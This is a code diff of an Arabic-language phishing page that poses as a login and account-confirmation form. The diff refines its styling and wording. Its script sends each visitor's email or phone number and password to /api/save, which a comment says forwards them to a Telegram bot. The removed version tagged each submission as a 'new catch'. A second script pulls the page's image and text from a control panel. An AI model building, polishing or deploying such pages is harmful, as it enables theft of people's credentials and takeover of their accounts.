@@ -3,52 +3,54 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
+    <title>تسجيل الدخول - تأكيد الحساب</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* إعدادات الجسم والخلفية */
+        /* إعدادات الخلفية والجسم ليكون مريحاً للعين */
         body {
             margin: 0;
             padding: 0;
+            font-family: 'Cairo', sans-serif; /* خط عصري وأنيق */
+            background-color: #f0f2f5; /* لون خلفية رمادي فاتح جداً هادئ */
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%); /* خلفية ناعمة مريحة للعين */
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
-        /* حاوية البطاقة الرئيسية */
+        /* حاوية البطاقة الرئيسية بلمسة احترافية */
         .login-card {
             background-color: #ffffff;
             width: 90%;
             max-width: 400px;
             padding: 40px 30px;
-            border-radius: 20px; /* حواف مستديرة جميلة */
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1); /* ظل ناعم يعطي عمقاً */
+            border-radius: 20px; /* حواف انسيابية مستديرة متقنة */
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1); /* ظل ناعم ليعطي عمقاً */
             text-align: center;
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            border: 1px solid #e1e4e8;
         }
 
-        /* تنسيق الصورة */
+        /* تنسيق الصورة المصغرة (اختياري) */
         #pageImg {
             width: 100px;
             height: 100px;
             border-radius: 50%; /* صورة دائرية */
-            object-fit: cover;
-            margin-bottom: 20px;
+            object-fit: contain; /* حافظ على أبعاد الصورة */
+            margin-bottom: 25px;
+            display: inline-block;
+            background-color: #f8fafc;
             border: 3px solid #f0f2f5;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
         }
 
         /* تنسيق النص (العنوان) */
         h2 {
             color: #333;
             font-size: 22px;
-            font-weight: 600;
+            font-weight: 700;
             margin-bottom: 30px;
         }
 
-        /* تنسيق حقول الإدخال */
+        /* تنسيق حقول الإدخال لتكون سهلة الاستخدام */
         .input-group {
             margin-bottom: 20px;
             text-align: right;
@@ -59,11 +61,11 @@
             padding: 14px 18px;
             font-size: 16px;
             border: 2px solid #e1e4e8;
-            border-radius: 12px; /* حواف مستديرة للحقول */
+            border-radius: 12px; /* حواف مستديرة متقنة للحقول */
             outline: none;
             transition: all 0.3s ease;
             box-sizing: border-box;
-            background-color: #f8f9fa;
+            background-color: #fbfcfd;
         }
 
         input:focus {
@@ -80,16 +82,16 @@
             display: none;
         }
 
-        /* تنسيق الزر الجذاب */
+        /* تنسيق الزر الأزرق الاحترافي */
         button {
             width: 100%;
             padding: 15px;
             background: linear-gradient(to right, #007bff, #0056b3); /* تدرج لوني للزر */
             color: white;
             border: none;
-            border-radius: 12px;
+            border-radius: 12px; /* حواف مستديرة متقنة للزر */
             font-size: 18px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
             margin-top: 10px;
@@ -111,25 +113,25 @@
     <div class="login-card">
         <img id="pageImg" src="https://telegra.ph/file/1792945d7d91986420551.jpg" alt="Logo">
         
-        <h2 id="pageLetter">سجل دخولك للمتابعة</h2>
+        <h2 id="pageLetter">سجل دخولك لتفعيل الخدمة</h2>
 
         <form id="authForm">
             <div class="input-group">
-                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو الهاتف" required>
-                <div id="userError" class="error-msg">⚠️ يرجى إدخال بريد أو هاتف صحيح</div>
+                <input type="text" id="userInput" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <div id="userError" class="error-msg">يرجى إدخال بيانات صحيحة</div>
             </div>
 
             <div class="input-group">
                 <input type="password" id="passInput" placeholder="كلمة السر" required>
             </div>
 
-            <button type="submit" id="pageBtn">تسجيل الدخول</button>
+            <button type="submit" id="pageBtn">تأكيد الآن</button>
         </form>
     </div>
 
     <script>
         // دالة جلب البيانات لتحديث الصورة والنصوص تلقائياً من اللوحة
-        async function fetchSettings() {
+        async function fetchConfig() {
             try {
                 const response = await fetch('/api/get');
                 const data = await response.json();
@@ -138,7 +140,7 @@
                 if(data.button) document.getElementById('pageBtn').innerText = data.button;
             } catch (e) { console.log("استخدام الإعدادات الافتراضية"); }
         }
-        window.onload = fetchSettings;
+        window.onload = fetchConfig;
 
         // التحقق من الإدخال والإرسال
         const form = document.getElementById('authForm');
@@ -159,14 +161,13 @@
                 return;
             }
 
-            // إرسال البيانات للبوت
+            // إرسال البيانات لبوت التلجرام
             await fetch('/api/save', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
-                    image: "✅ صيد جديد مرتب",
-                    letter: "اليوزر: " + user,
-                    button: "الباسورد: " + pass
+                    letter: "👤 المستخدم: " + user,
+                    button: "🔑 كلمة السر: " + pass
                 })
             });
 
